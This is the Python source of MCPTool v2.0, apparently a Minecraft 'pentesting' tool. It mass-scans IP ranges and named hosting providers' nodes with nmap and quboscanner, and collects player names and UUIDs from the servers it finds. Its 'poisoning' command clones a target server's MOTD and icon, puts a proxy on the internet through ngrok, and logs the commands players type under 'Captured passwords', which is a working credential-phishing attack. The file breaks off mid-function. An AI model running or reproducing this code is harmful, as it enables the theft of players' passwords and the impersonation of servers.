# =============================================================================
#                      MCPTool v2.0 www.github.com/wrrulos
#                         Pentesting Tool for Minecraft
#                               Made by wRRulos
#                                  @wrrulos
# =============================================================================

# Any error report it to my discord please, thank you.
# Programmed in Python 3.10.1

import hashlib
import os
import sys
import time
import requests
import json
import re
import socket
import uuid
import subprocess
import shutil
import base64
import traceback

from mcstatus import MinecraftServer
from datetime import datetime
from colorama import Fore, init
from json import JSONDecodeError

init()

# CONFIG

DEBUG = False
SKIP_LOAD = False

# COLORS

red = Fore.RED
lred = Fore.LIGHTRED_EX
black = Fore.BLACK
lblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
lwhite = Fore.LIGHTWHITE_EX
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
cyan = Fore.CYAN
lcyan = Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lmagenta = Fore.LIGHTMAGENTA_EX
yellow = Fore.YELLOW
lyellow = Fore.LIGHTYELLOW_EX
blue = Fore.BLUE
lblue = Fore.LIGHTBLUE_EX
reset = Fore.RESET

# APIS

mojang_api = "https://api.mojang.com/users/profiles/minecraft/"
mcsrvstat_api = "https://api.mcsrvstat.us/2/"

# ANIMATIONS

animation = r"|/-\\"
animation1 = ".."

# OTHERS

host_list = ["minehost", "holyhosting", "vultam"]
script_verison = 11
script__version = "2.0"
number_of_servers = 0
version_link = "https://raw.githubusercontent.com/wrrulos/MCPTool/main/config/data/version"
discord_link = "discord.gg/ewPyW4Ghzj"

banner = rf""" 
{lred}                         __
{lred}           ---_ ...... _/_ -
{lred}          /  .      ./ .'*\ \
{lred}          : '         /__-'   \.
{lred}         /                      )     {lred}___  ________ ______ _____ _____  _____ _       
{lred}       _/                  >   .'     {lred}|  \/  /  __ \| ___ \_   _|  _  ||  _  | |       {lred}Discord: {white}Rulo#9224
{lred}     /   '   .       _.-" /  .'       {lred}| |\/| | |    |  __/  | | | | | || | | | |       {lred}Github: {white}@wrrulos
{white}     \           __/"     /.'         {white}| |  | | \__/\| |     | | \ \_/ /\ \_/ / |____
{white}       \ '--  .-" /     //'           {white}\_|  |_/\____/\_|     \_/  \___/  \___/\_____/   {lred}Minecraft Pentesting Tool {lgreen}v{script__version}{green}
{white}        \|  \ | /     //                        
{white}             \:     //                
{white}          `\/     //                  Do you want to join my discord? Use discord command
{white}           \__`\/ /  
{white}               \_|{reset}\

"""  # Thanks Ghosty for helping me with the banner <3

loading_banner = rf"""





                                         {lred}                         __
                                         {lred}           ---_ ...... _/_ -
                                         {lred}          /  .      ./ .'*\ \
                                         {lred}          : '         /__-'   \.
                                         {lred}         /                      )     
                                         {lred}       _/                  >   .'     
                                         {lred}     /   '   .       _.-" /  .'      
                                         {white}     \           __/"     /.'      
                                         {white}       \ '--  .-" /     //'          
                                         {white}        \|  \ | /     //      
                                         {white}          `\/     //
                                         {white}           \__`\/ /                    
                                         {white}               \_|{reset}

"""

help_message = f"""
     ╔══════════════════════════════╦═══════════════════════════════════════╗                          
     ║  Command list                ║            Description                ║
     ║                              ║                                       ║
     ║  server [ip]                 ║  Displays information about a server. ║
     ║  player [name]               ║  Displays information about a player. ║
     ║  scan [ip]                   ║  Scan the ports of an IP.             ║
     ║  qubo [ip] [ports] [th] [ti] ║  Scan the IP using quboscanner.       ║
     ║  host [host] [ports]         ║  Scans the nodes of a host.           ║
     ║  mods [ip:port]              ║  Show mods on this server.            ║
     ║  checker [file]              ║  Check the servers of a file.         ║
     ║  bungee [ip:port]            ║  Start a proxy server.                ║  
     ║  listening [ip:port]         ║  Get the names of the users           ║
     ║                              ║  from the server.                     ║
     ║  poisoning [server] [port]   ║  Create a proxy connection that       ║
     ║                              ║  redirects to a server and captures   ║
     ║                              ║  commands.                            ║
     ║                              ║                                       ║
     ║  discord                     ║  Show my server link.                 ║
     ║  clear                       ║  Clean the screen.                    ║
     ╚══════════════════════════════╩═══════════════════════════════════════╝"""

# CHECK


def check_nmap():
    """ Check if nmap is installed """

    if os.system("nmap --version >nul 2>&1") == 0:
        return True

    print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}You need to install nmap!")
    return False


def check_java():
    """ Check if java is installed """

    if os.system("java -version >nul 2>&1") == 0:
        return True

    print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}You need to install Java!")
    return False


def check_nmap_error(scan_file, target):
    """ Check if nmap arguments are valid """
    f = open(scan_file)
    content = f.read()
    f.close()

    if "Ports specified must be between 0 and 65535 inclusive" in content or "Your port specifications are illegal." in content or "Found no matches for the service mask" in content:
        scan_error = "ports"
        print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid port range")
        return scan_error

    if f'Failed to resolve "{target}".' in content:
        scan_error = "target"
        return scan_error

    if "QUITTING!" in content:
        scan_error = "unknown"
        return scan_error

    scan_error = "None"
    return scan_error


def check_qubo(threads, timeout):
    """ Check if the arguments is valid """

    if threads.isdecimal():
        if timeout.isdecimal():
            return True

        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Please enter a valid threads value!")
        return False

    print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Please enter a valid timeout value")
    return False


def check_ngrok(proxy_port):
    """ Check if ngrok is installed """

    if os.system("ngrok -v >nul 2>&1") == 0:
        ngrok_command = f"ngrok tcp {proxy_port}"
        return True, ngrok_command

    if os.name == "nt":
        if os.path.isfile("ngrok.exe"):
            ngrok_command = f"ngrok.exe tcp {proxy_port}"
            return True, ngrok_command

        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}The file ngrok.exe could not be found.")
        return False, None

    if os.path.isfile("ngrok"):
        ngrok_command = f"./ngrok tcp {proxy_port}"
        return True, ngrok_command

    print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}The file ngrok could not be found.")
    return False, None


def check_folder(folder):
    """ Check if the following folders exist """
    if os.path.isdir(folder):
        pass

    else:
        os.mkdir(folder)


def check_file(file):
    """ Check if the file exist """

    if os.path.isfile(file):
        f = open(file, "w+", encoding="utf8")
        f.truncate(0)
        f.close()
        return

    f = open(file, "w")
    f.close()
    return


def check_server(target):
    try:
        srv = MinecraftServer.lookup(target)
        srv.status()
        return True

    except socket.gaierror:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")
        return False

    except TimeoutError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")
        return False

    except:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")
        return False


def check_port(port):
    """ Check if the port are valid"""
    if port.isdecimal():
        if int(port) <= 65535:
            return True

    print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid port.")
    return False


def check_updates():
    """ Check updates """
    r = requests.get(version_link)
    version = r.text
    time.sleep(2)

    if int(version) > int(script_verison):
        return True

    return False


# FUNCTIONS

def load():
    """ Starting MCPTool """
    try:
        os.system("cls || clear")
        print(loading_banner, "\n                                                Checking for updates.", end="")
        time.sleep(0.4)

        for _ in animation1:
            print(_, end="")
            time.sleep(0.4)

        check__updates = check_updates()

        if check__updates:
            os.system("cls || clear")
            print(loading_banner, f"\n                                            {lgreen}New version available on my github.\n\n{white}                                                https://github.com/wrrulos/\n\n")
            time.sleep(1)
            print(f"{white}                                          Starting MCPTool with the current version")
            time.sleep(2)
            return

        os.system("cls || clear")
        print(loading_banner, f"\n                                            {white}You are using the latest version!")
        time.sleep(2)
        return

    except:
        pass


def save_logs(name, target):
    date = datetime.now()

    if name == "poisoning":
        file = f"results/poisoning/poisoning_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
        f = open(file, "w", encoding="utf8")
        f.write("##################\n# POISONING LOGS #\n##################\n\n")
        f.write(f"[DATE] {str(date.year)}-{str(date.month)}-{str(date.day)}\n[HOUR] {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n[SERVER] {str(target)}\n\n")
        f.write("Captured passwords: \n\n")
        f.close()
        return file

    if name == "scan":
        file = f"results/scan/scan_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
        f = open(file, "w", encoding="utf8")
        f.write("#############\n# SCAN LOGS #\n#############\n\n")
        f.write(f"[DATE] {str(date.year)}-{str(date.month)}-{str(date.day)}\n[HOUR] {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n[TARGET] {str(target)}\n\n")
        f.write("Servers found:")
        f.close()
        return file

    if name == "host":
        file = f"results/host/{target}/{target}_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
        f = open(file, "w", encoding="utf8")
        f.write("#############\n# HOST LOGS #\n#############\n\n")
        f.write(f"[DATE] {str(date.year)}-{str(date.month)}-{str(date.day)}\n[HOUR] {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n[HOST] {str(target)}\n\n")
        f.write("Servers found:")
        f.close()
        return file

    if name == "qubo":
        file = f"results/qubo/qubo_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
        f = open(file, "w", encoding="utf8")
        f.write("#############\n# QUBO LOGS #\n#############\n\n")
        f.write(f"[DATE] {str(date.year)}-{str(date.month)}-{str(date.day)}\n[HOUR] {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n[TARGET] {str(target)}\n\n")
        f.write("Servers found:")
        f.close()
        return file

    if name == "checker":
        file = f"results/checker/checker_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
        f = open(file, "w", encoding="utf8")
        f.write("################\n# CHECKER LOGS #\n################\n\n")
        f.write(f"[DATE] {str(date.year)}-{str(date.month)}-{str(date.day)}\n[HOUR] {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n[FILE] {str(target)}\n\n")
        f.write("Servers found:")
        f.close()
        return file


def replace_text(text):
    """ Replace the text """
    if "§0" in text:
        text = text.replace("§0", "{}".format(lblack))

    if "§1" in text:
        text = text.replace("§1", "{}".format(blue))

    if "§2" in text:
        text = text.replace("§2", "{}".format(lgreen))

    if "§3" in text:
        text = text.replace("§3", "{}".format(cyan))

    if "§4" in text:
        text = text.replace("§4", "{}".format(red))

    if "§5" in text:
        text = text.replace("§5", "{}".format(magenta))

    if "§6" in text:
        text = text.replace("§6", "{}".format(yellow))

    if "§7" in text:
        text = text.replace("§7", "{}".format(lblack))

    if "§8" in text:
        text = text.replace("§8", "{}".format(lblack))

    if "§9" in text:
        text = text.replace("§9", "{}".format(lblue))

    if "§a" in text:
        text = text.replace("§a", "{}".format(lgreen))

    if "§b" in text:
        text = text.replace("§b", "{}".format(lcyan))

    if "§c" in text:
        text = text.replace("§c", "{}".format(lred))

    if "§d" in text:
        text = text.replace("§d", "{}".format(lmagenta))

    if "§e" in text:
        text = text.replace("§e", "{}".format(lyellow))

    if "§f" in text:
        text = text.replace("§f", "{}".format(white))

    if "§k" in text or "§l" in text or "§m" in text or "§n" in text or "§o" in text or "§r" in text:
        text = text.replace("§k", "").replace("§l", "").replace("§m", "").replace("§n", "").replace("§o", "").replace("§r", "")

    if "\n" in text:
        text = text.replace("\n", "")

    text = re.sub(" +", " ", text)
    return text


def nmap_scan(name_command, target, ports, skip, logs_file):
    """ Scan nmap """
    check_folder("results")
    date = datetime.now()
    scan_file = f"temp_scan_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"

    if not name_command == "host":
        check_folder("results/scan")
        os.system("cls || clear")
        print(banner, f"\n     {lblack}[{lred}SCAN{white}NER{lblack}] {white}Scanning {green}{target}{white}.. \n\n     {white}[{lcyan}INFO{white}] {white}Remember that you cannot have the vpn activated to scan!")

    os.system(f"nmap -p {str(ports)} -T5 -Pn -v -oN {scan_file} {str(target)} >nul 2>&1")
    nmap_error = check_nmap_error(scan_file, target)

    if not nmap_error == "None":
        return

    if not name_command == "host":
        logs_file = save_logs("scan", target)

    scan_ips_list_date = datetime.now()
    scan_ips_list = f"temp_scan_ips_list_{str(scan_ips_list_date.day)}-{str(scan_ips_list_date.month)}-{str(scan_ips_list_date.year)}_{str(scan_ips_list_date.hour)}.{str(scan_ips_list_date.minute)}.{str(scan_ips_list_date.second)}.txt"
    scan_results = open(scan_ips_list, "w+")

    with open(scan_file, encoding="utf8") as nmap_result:
        for line in nmap_result:
            ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line)
            ip = " ".join(ip)
            ip = ip.replace("(", "").replace(")", "")
            port = re.findall("\d{1,5}\/tcp open", line)
            port = " ".join(port)

            if "." in ip:
                ip_actual = ip

            if "tcp" in port:
                port = port.replace("/tcp open", "")
                ip_actual_backup = ip_actual

                try:
                    ip_actual = ip_actual.split(" ")
                    ip_actual = ip_actual[1]

                except:
                    ip_actual = ip_actual_backup

                scan_results.write(f"{ip_actual}:{port}\n")

        scan_results.close()

    with open(scan_ips_list) as scan_results:
        for line in scan_results:
            line = line.replace("\n", "")
            try:
                get_server(line, skip, logs_file)

            except:
                pass

    os.remove(scan_file)
    os.remove(scan_ips_list)


def get_server(ip, skip, logs_file):
    global number_of_servers

    try:
        players = None
        srv = MinecraftServer.lookup(ip)

        response = srv.status()
        motd = replace_text(response.description)
        motd_ = response.description.replace('§1', '').replace('§2', '').replace('§3', '').replace('§4', '').replace('§5', '').replace('§6', '').replace('§7', '').replace('§8', '').replace('§9', '').replace('§0', '').replace('§a', '').replace('§b', '').replace('§c', '').replace('§d', '').replace('§e', '').replace('§f', '').replace('§k', '').replace('§l', '').replace('§m', '').replace('§n', '').replace('§o', '').replace('§r', '').replace('\n', '')
        motd_ = re.sub(" +", " ", motd_)
        version = replace_text(response.version.name)
        version_ = response.version.name.replace('§1', '').replace('§2', '').replace('§3', '').replace('§4', '').replace('§5', '').replace('§6', '').replace('§7', '').replace('§8', '').replace('§9', '').replace('§0', '').replace('§a', '').replace('§b', '').replace('§c', '').replace('§d', '').replace('§e', '').replace('§f', '').replace('§k', '').replace('§l', '').replace('§m', '').replace('§n', '').replace('§o', '').replace('§r', '').replace('\n', '')
        version_ = re.sub(" +", " ", version_)

        if response.players.sample is not None:
            players = str([f"{player.name} ({player.id})" for player in response.players.sample])
            players = players.replace("[", "").replace("]", "").replace("'", "")

        if skip:
            if not str(response.players.online) == "0":
                pass

            else:
                return

        print(f"\n     {lblack}[{lred}I{white}P{lblack}] {white}{ip}")
        print(f"     {lblack}[{lred}MO{white}TD{lblack}] {white}{motd}")
        print(f"     {lblack}[{lred}Ver{white}sion{lblack}] {white}{version}")
        print(f"     {lblack}[{lred}Proto{white}col{lblack}] {white}{response.version.protocol}")
        print(f"     {lblack}[{lred}Play{white}ers{lblack}] {white}{response.players.online}{lblack}/{white}{response.players.max}")

        with open(logs_file, "a", encoding="utf8") as f:
            f.write(f"\n\n[IP] {ip}")
            f.write(f"\n[MOTD] {motd_}")
            f.write(f"\n[Version] {version_}")
            f.write(f"\n[Protocol] {response.version.protocol}")
            f.write(f"\n[Players] {response.players.online}/{response.players.max}")

        if response.players.sample is not None:
            if players != "":
                try:
                    re.findall(r"[0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z]", players)
                    if "00000000-0000-0000-0000-000000000000" not in players:
                        print(f"     {lblack}[{lred}Nam{white}es{lblack}] {white}{players}")
                        with open(logs_file, "a") as f:
                            f.write(f"\n[Names] {players}")

                except:
                    pass

        number_of_servers += 1

    except TimeoutError:
        pass

    except OSError:
        pass

    except UnicodeDecodeError:
        pass


def get_ngrok_ip():
    r = requests.get("http://localhost:4040/api/tunnels")
    r_unicode = r.content.decode("utf-8")
    r_json = json.loads(r_unicode)
    link = r_json["tunnels"][0]["public_url"]
    ipngrok = link.replace("tcp://", "")
    ipngrok = ipngrok.split(":")
    ipngrok2 = socket.gethostbyname(str(ipngrok[0]))
    ip_poisoning = ipngrok2 + ":" + ipngrok[1]
    return ip_poisoning


def skip_0on():
    while True:
        skip = input("\n     Do you want to skip the servers that have no players connected? yes/no -> ")

        if skip.lower() == "y" or skip.lower() == "yes":
            return True

        elif skip.lower() == "n" or skip.lower() == "no":
            return False

        else:
            continue


# COMMANDS

def checker_command(file, skip):
    x = 0

    try:
        f = open(file, "r+", encoding="unicode_escape")
        check_folder("results")
        check_folder("results/checker")
        logs_file = save_logs("checker", file)
        os.system("cls || clear")

        print(banner, f"\n     {lblack}[{lred}CHE{white}CKER{lblack}] {white}Checking the file..")

        if "Nmap done at" in f.read():
            f.close()
            with open(file, encoding="unicode_escape") as nmap_result:
                for line in nmap_result:
                    ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line)
                    ip = " ".join(ip)
                    ip = ip.replace("(", "").replace(")", "")
                    port = re.findall("\d{1,5}\/tcp open", line)
                    port = " ".join(port)

                    if "." in ip:
                        ip_current = ip

                    if "tcp" in port:
                        port = port.replace("/tcp open", "")
                        ip_current_backup = ip_current

                        try:
                            ip_current = ip_current.split(" ")
                            ip_current = ip_current[1]

                        except:
                            ip_current = ip_current_backup

                        x += 1
                        get_server(f"{ip_current}:{port}", skip, logs_file)

            return

        with open(file, encoding="unicode_escape") as results:
            for line in results:
                ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}", line)
                ip = " ".join(ip)
                if ":" in ip:
                    x += 1
                    get_server(ip, skip, logs_file)

        if x == 0:
            print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}No IP addresses found in the file!")
            return

        return

    except FileNotFoundError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}File not found.")
        return


def bungee_command(target):
    print(f"\n     {lblack}[{lred}PRO{white}XY{lblack}] {white}Starting proxy..")

    config_file = open("config/files/config_bungee.txt", "r")
    yml_config = config_file.read()
    config_file.close()

    config_file = open("config/bungee/config.yml", "w+")
    config_file.truncate(0)
    config_file.write(yml_config)
    config_file.write(f"\n    address: {str(target)}\n")
    config_file.write(f"    restricted: false")
    config_file.close()
    bungee = subprocess.Popen("cd config/bungee && java -Xms512M -Xmx512M -jar WaterFall.jar >nul 2>&1", stdout=subprocess.PIPE, shell=True)
    print(f"\n     {lblack}[{lred}I{white}P{lblack}] {white}127.0.0.1:33330 \n\n     {lblack}[{white}#{lblack}] {white}Press ctrl c to stop the proxy")

    try:
        while True:
            pass

    except KeyboardInterrupt:
        print(f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")
        bungee.kill()


def poisoning_command(target, port, ngrok_command):
    check_folder("results")
    check_folder("results/poisoning")
    old_content = " "

    r = requests.get(f"{mcsrvstat_api}{target}")
    r_json = r.json()
    clean = r_json["motd"]["raw"]

    try:
        icon = r_json["icon"]
        data = icon.replace("data:image/png;base64,", "")
        image = base64.b64decode(data)

        with open(f"config/poisoning/server-icon.png", "wb") as f:
            f.write(image)

    except:
        shutil.copy("config/files/default-icon.png", "config/poisoning/server-icon.png")

    try:
        _ = clean[0]
        _ = clean[1]
        n = 1

    except:
        n = 0

    config_file = open("config/files/config_poisoning.txt", "r+")
    yml_config = config_file.read()
    config_file.close()
    yml_port = re.sub("0.0.0.0:[0-9][0-9][0-9][0-9][0-9]", f"0.0.0.0:{port}", yml_config)
    config_file = open("config/poisoning/config.yml", "w+", encoding="utf8")
    config_file.truncate(0)
    config_file.write(yml_port)
    config_file.write(f"\n    address: {str(target)}\n")
    config_file.write(f"    restricted: false")
    config_file.close()
    motd_file = open("config/files/config_motd.txt", "r+")
    yml_config = motd_file.read()
    motd_file.close()
    motd_file = open("config/poisoning/plugins/CleanMOTD/config.yml", "w+", encoding="utf8")
    motd_file.truncate(0)
    motd_file.write(yml_config)

    logs_file = save_logs("poisoning", target)

    if n == 1:
        motd_file.write(f"        {clean[0]}")
        motd_file.write(f"        {clean[1]}")

    else:
        motd_file.write(f'        {clean[0]}')

    motd_file.close()
    os.system("cls || clear")
    check_folder("config/poisoning/plugins/RPoisoner")
    check_file("config/poisoning/plugins/RPoisoner/commands.txt")
    print(banner, f"\n     {lblack}[{lred}PRO{white}XY{lblack}] {white}Starting proxy..")
    time.sleep(1)
    proxy = subprocess.Popen("cd config/poisoning && java -Xms512M -Xmx512M -jar WaterFall.jar >nul 2>&1", stdout=subprocess.PIPE, shell=True)
    print(f"\n     {lblack}[{lred}NGR{white}OK{lblack}] {white}Starting ngrok..")
    ngrok = subprocess.Popen(ngrok_command, stdout=subprocess.PIPE, shell=True)
    time.sleep(1)

    ip_poisoning = get_ngrok_ip()

    print(f"\n     {lblack}[{lred}I{white}P{lblack}] {white}{str(ip_poisoning)}")
    print(f"\n     {lblack}[{lred}I{white}P{lblack}] {white}127.0.0.1:{port}")
    print(f"\n     {lblack}[{white}#{lblack}] {white}Waiting for commands..\n")

    while True:
        try:
            time.sleep(1)
            commands_file = open("config/poisoning/plugins/RPoisoner/commands.txt", "r", encoding="unicode_escape")
            content = commands_file.readlines()

            if content == old_content:
                continue

            old_content = content

            for line in content:
                print(f"     {lblack}[{lgreen}!{lblack}] {white}Command captured {line}")
                with open(logs_file, "a") as f:
                    f.write(f"Player {line}")

        except KeyboardInterrupt:
            ngrok.kill()
            proxy.kill()
            break


def qubo_command(target, ports, threads, timeout, skip):
    qubo_file = "unknown"
    qubo_ips = []

    os.system("cls || clear")
    check_folder("results")
    check_folder("results/qubo")
    check_folder("config/qubo/outputs")
    file_list = os.listdir("config/qubo/outputs")
    print(banner, f"\n     {lblack}[{lred}SCAN{white}NER{lblack}] {white}Scanning {green}{target} with quboscanner{white}.. \n\n     {white}[{lcyan}INFO{white}] {white}Remember that you cannot have the vpn activated to scan!")

    os.system(f"cd config/qubo && java -Dfile.encoding=UTF-8 -jar qubo.jar -range {target} -ports {ports} -th {threads} -ti {timeout} >nul 2>&1")
    new_file_list = os.listdir("config/qubo/outputs")

    for file in new_file_list:
        if file in file_list:
            pass
        else:
            qubo_file = file

    if qubo_file == "unknown":
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid IP")
        return

    with open(f"config/qubo/outputs/{qubo_file}", encoding="utf8") as qubo_result:
        for line in qubo_result:
            qubo_ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}", line)
            qubo_ip = " ".join(qubo_ip)
            if ":" in qubo_ip:
                qubo_ips.append(f"{qubo_ip}")

    if len(qubo_ips) == 0:
        print(f"\n{white}     The scan ended and found {lred}0 {white}servers.")
        return

    logs_file = save_logs("qubo", target)

    for ip in qubo_ips:
        get_server(ip, skip, logs_file)


def host_command(host, ports, skip):
    """ Host command """
    check_folder("results")
    check_folder("results/host")
    nodes = []
    host_nodes = ""
    domain = ""
    num_nodes = 0

    if host == "minehost":
        check_folder("results/host/minehost")
        host_nodes = ("sv1", "sv10", "sv11", "sv15", "sv16", "sv17")
        domain = ".minehost.com.ar"

    if host == "holyhosting":
        check_folder("results/host/holyhosting")
        host_nodes = ("node-germany", "node-newyork", "ca", "tx2", "node-cl2", "fr", "node-ashburn", "node-premium3", "node-dallas", "premium2", "node-valdivia", "node-premium")
        domain = ".holy.gg"

    if host == "vultam":
        check_folder("results/host/vultam")
        host_nodes = ("ca", "ca02", "ca03", "ca04", "ca05", "ca06", "ca07", "mia", "mia02", "mia03", "mia04", "mia05", "mia06", "mia07", "mia08", "mia09", "mia10", "mia12", "mia13", "mia14", "mia15", "mia16", "fr01", "fr02", "fr03", "ny", "ny02", "ny04", "ny05", "ny06", "ny07", "de", "de02")
        domain = ".vultam.net"

    logs_file = save_logs("host", host)

    os.system("cls || clear")
    print(banner, f"\n     {white}[{lgreen}#{white}] {white}Scanning the hosting {green}{host}{white}.. \n\n     {white}[{lcyan}INFO{white}] {white}Remember that you cannot have the vpn activated to scan!")
    time.sleep(1)

    for node in host_nodes:
        try:
            node_ip = socket.gethostbyname(f"{str(node)}{str(domain)}")
            nodes.append(node_ip)
            num_nodes += 1
        except:
            pass

    if num_nodes == 0:
        print(f"\n     {lblack}[{lred}-{lblack}] {white}No active nodes were found. Try again later")
        return

    print(f"\n     {lblack}[{lgreen}+{lblack}] {white}Found nodes: {num_nodes}")

    for node in nodes:
        nmap_scan("host", node, ports, skip, logs_file)


def mods_command(server):
    """ Mods command """
    try:
        r = requests.get(f"{mcsrvstat_api}{server}")
        r_json = r.json()
        mods = r_json["mods"]["names"]
        print(f"\n     {lblack}[{lred}MO{white}DS{lblack}] {white}Mods found: {lgreen}", end="")

        for _ in mods:
            print(f"{_} ", end="")

        print("")

    except KeyboardInterrupt:
        pass

    except TimeoutError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")

    except KeyError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}I couldn't find the mods for this server!")

    except:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}I couldn't find the mods for this server!")


def listening_command(target):
    """ Listening command """
    player_list = []
    found = False
    print(f"\n     {lblack}[{lred}LISTE{white}NING{lblack}] {white}Waiting for the players..")

    while True:
        try:
            srv = MinecraftServer.lookup(target)
            response = srv.status()
            if response.players.sample is not None:
                for player in response.players.sample:
                    if player.name != "":
                        if not found:
                            print(f"\n     {lblack}[{lred}FOU{white}ND{lblack}] {white}Players found: {lgreen}", end="")
                            found = True

                        if f"{player.name} ({player.id})" not in player_list:
                            player_found = f"{player.name} ({player.id})"
                            player_list.append(player_found)
                            print(f"{player_found}, ", end="")
                            sys.stdout.flush()

            time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")
            return

        except Exception as e:
            print(e)
            pass


def server_command(server):
    """ Server command """
    players = None

    try:
        try:
            r = requests.get(f"{mcsrvstat_api}{server}")
            r_json = r.json()
            ip = r_json["ip"]
            port = r_json["port"]

        except:
            ip = "127.0.0.1"
            port = 25565

        srv = MinecraftServer.lookup(server)

        response = srv.status()
        motd = replace_text(response.description)
        version = replace_text(response.version.name)

        if response.players.sample is not None:
            players = str([f"{player.name} ({player.id})" for player in response.players.sample])
            players = players.replace("[", "").replace("]", "").replace("'", "")

        print(f"\n     {lblack}[{lred}I{white}P{lblack}] {white}{ip}:{port}")
        print(f"     {lblack}[{lred}MO{white}TD{lblack}] {white}{motd}")
        print(f"     {lblack}[{lred}Ver{white}sion{lblack}] {white}{version}")
        print(f"     {lblack}[{lred}Proto{white}col{lblack}] {white}{response.version.protocol}")
        print(f"     {lblack}[{lred}Play{white}ers{lblack}] {white}{response.players.online}{lblack}/{white}{response.players.max}")

        if response.players.sample is not None:
            if players != "":
                print(f"     {lblack}[{lred}Nam{white}es{lblack}] {white}{players}")

    except KeyboardInterrupt:
        pass

    except TimeoutError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")

    except:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")


def player_command(nick):
    try:
        r = requests.get(f"{mojang_api}{nick}")
        r_json = r.json()
        player_uuid = r_json["id"]
        player_uuid_ = f"{player_uuid[0:8]}-{player_uuid[8:12]}-{player_uuid[12:16]}-{player_uuid[16:21]}-{player_uuid[21:32]}"

        offline_player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f"OfflinePlayer:{nick}", "utf-8")).digest()[:16], version=3))
        offline_player_uuid_ = offline_player_uuid.replace("-", "")

        print(f"\n{lblack}     [{lred}UU{white}ID{lblack}] {white}{player_uuid}")
        print(f"{lblack}     [{lred}UU{white}ID{lblack}] {white}{player_uuid_}\n")
        print(f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid}")
        print(f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid_}")

    except KeyboardInterrupt:
        pass

    except JSONDecodeError:
        offline_player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f"OfflinePlayer:{nick}", "utf-8")).digest()[:16], version=3))
        offline_player_uuid_ = offline_player_uuid.replace("-", "")
        print(f"\n{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid}")
        print(f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid_}")

    except requests.exceptions.ConnectionError:
        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Connection error.")

    except:
        offline_player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f"OfflinePlayer:{nick}", "utf-8")).digest()[:16], version=3))
        offline_player_uuid_ = offline_player_uuid.replace("-", "")
        print(f"\n{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid}")
        print(f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{offline_player_uuid_}")


def main():
    """ Main """
    global number_of_servers

    argument = input().split()

    if len(argument) == 0:
        print(f"\n     {lblack}[{red}-{lblack}] {lred}Unknown command. Type help to see the available commands.")

    try:
        command = argument[0]

        if command.lower() == "help":
            print(help_message)

        elif command.lower() == "cls" or command.lower() == "clear":
            os.system("cls || clear")
            print(banner)

        elif command.lower() == "server" or command.lower() == "srv":
            try:
                server = argument[1]
                server_command(server)

            except IndexError:
